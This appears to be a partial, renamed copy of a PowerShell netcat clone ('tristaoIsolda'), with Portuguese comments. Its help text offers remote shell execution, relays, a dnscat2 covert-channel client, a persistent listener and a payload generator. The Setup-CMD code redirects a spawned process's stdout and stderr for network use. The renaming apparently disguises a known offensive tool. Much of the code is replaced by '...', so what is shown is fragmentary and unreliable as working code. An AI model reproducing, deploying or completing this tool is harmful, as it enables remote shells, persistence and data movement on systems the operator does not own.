function tristaoIsolda
{
  ...
  ############### HELP ###############
  $Help = "
tristaoIsolda - Netcat, The Powershell Version
Github Repository: https://github.com/besimorhino/tristaoIsolda

This script attempts to implement the features of netcat in a powershell
script. It also contains extra features such as built-in relays, execute
powershell, and a dnscat2 client.

Usage: tristaoIsolda [-c or -l] [-p port] [options]
  ...
  -i  <input>     Input. Provide data to be sent down the pipe as soon as a connection is
                  ...
                  tristaoIsolda, like 'aaaaaa' | tristaoIsolda -c 10.1.1.1 -p 80
            
  -o  <type>      Output. Specify how tristaoIsolda should return information to the console.
                  Valid options are 'Bytes', 'String', or 'Host'. Default is 'Host'.
            
  -of <path>      Output File.  Specify the path to a file to write output to.
            
  -d              Disconnect. tristaoIsolda will disconnect after the connection is established
                  and the input from -i is sent. Used for scanning.
            
  -rep            Repeater. tristaoIsolda will continually restart after it is disconnected.
                  Used for setting up a persistent server.
                  
  -g              Generate Payload.  Returns a script as a string which will execute the
                  tristaoIsolda with the options you have specified. -i, -d, and -rep will not
                  be incorporated.
...
"
  ...
  {
    param($FuncSetupVars)
    if ($global:Verbose -eq $true) { $Verbose = $true }
  ...
  function Setup-CMD {
      param (
          ...
          [string[]]$FuncSetupVars
      )

      # Habilita verbose se definido globalmente
      if ($global:Verbose) { $VerbosePreference = 'Continue' }

      # Inicializa dicionário de variáveis
      $FuncVars = @{}

      # Configura objeto de inicialização do processo
      $startInfo = [System.Diagnostics.ProcessStartInfo]::new()
      $startInfo.FileName = $FuncSetupVars[0]
      ...
      # Define buffers e operações de leitura assíncrona
      $FuncVars["Process"] = $process
      $FuncVars["StdOutDestinationBuffer"] = New-Object byte[] 65536
      $FuncVars["StdOutReadOperation"] = $process.StandardOutput.BaseStream.BeginRead(
          $FuncVars["StdOutDestinationBuffer"], 0, 65536, $null, $null
      )
      $FuncVars["StdErrDestinationBuffer"] = New-Object byte[] 65536
      $FuncVars["StdErrReadOperation"] = $process.StandardError.BaseStream.BeginRead(
          $FuncVars["StdErrDestinationBuffer"], 0, 65536, $null, $null
      )

      # Define codificação
      $FuncVars["Encoding"] = [System.Text.ASCIIEncoding]::new()
